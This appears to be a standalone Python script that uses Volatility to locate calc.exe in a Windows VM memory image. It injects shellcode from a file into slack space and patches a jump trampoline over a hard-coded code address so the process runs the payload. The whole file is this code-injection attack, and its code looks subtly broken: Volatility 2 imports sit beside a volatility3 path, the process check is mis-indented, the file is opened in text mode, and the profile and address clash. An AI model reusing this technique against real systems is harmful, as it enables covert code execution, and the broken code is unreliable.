import sys
import struct
import volatility.conf as conf
import volatility.registry as registry
import volatility.commands as commands
import volatility.addrspace as addrspace
import volatility.plugins.taskmods as taskmods

equals_button = 0x01005D51

memory_file = "Win10X64.vmem"
slack_space = None
trampoline_offset = None

# read in our shellcode
with open("cmeasure.bin", "rb") as sc_fd:
    sc = sc_fd.read()
    
sys.path.append("/volatility3.1.0.0")

registry.PluginImporter()
config = conf.ConfObject()

config.parse_options()
config.PROFILE = "Win10X64"
config.LOCATION = f"file://{memory_file}"

registry.register_global_options(config, commands.Command)
registry.register_global_options(config, addrspace.BaseAddressSpace)

p = taskmods.PSList(config)

for process in p.calculate():
    if str(process.ImageFileName) == "calc.exe":
        print(f"[*] Found calc.exe with PID {process.UniqueProcessId}")
        print("[*] Hunting for physical offsets...please wait")
    
    address_space = process.get_process_address_space()
    pages = address_space.get_available_pages()
    
    for page in pages:
        physical = address_space.vtop(page[0])
        if physical is not None:
            if slack_space is None:
                
                with open(memory_file, "r+") as fd:
                    fd.seek(physical)
                    buf = fd.read(page[1])
                    try:
                        offset = buf.index("\x00" * len(sc))
                        slack_space = page[0] + offset
                        
                        print("[*] Found good shellcode location!")
                        print("[*] Virtual address: 0x%08x" % slack_space)
                        print("[*] Physical address: 0x%08x" % (physical + offset))
                        print("[*] Injecting shellcode.")
                        
                        fd.seek(physical + offset)
                        fd.write(sc.decode())
                        fd.flush()
                        
                        # create our trampoline
                        tramp = "\xbb%s" % struct.pack("<L", page[0] + offset)
                        tramp += "\xff\xe3"

                        if trampoline_offset is not None:
                            break
                    except:
                        pass
                        
                    # check for our target code location
                    if page[0] <= equals_button < ((page[0] + page[1]) - 7):
                        
                        # calculate virtual offset
                        v_offset = equals_button - page[0]
                        
                        # calculate physical offset
                        trampoline_offset = physical + v_offset
                        
                        print("[*] Found our trampoline target at: 0x%08x" % (
                            trampoline_offset))
                        if slack_space is not None:
                            break
            
            print("[*] Writing trampoline...")
            
            with open(memory_file, "r+") as fd:
                fd.seek(trampoline_offset)
                fd.write(tramp)
                fd.close()
                
            print("[*] Done injecting the code")
                        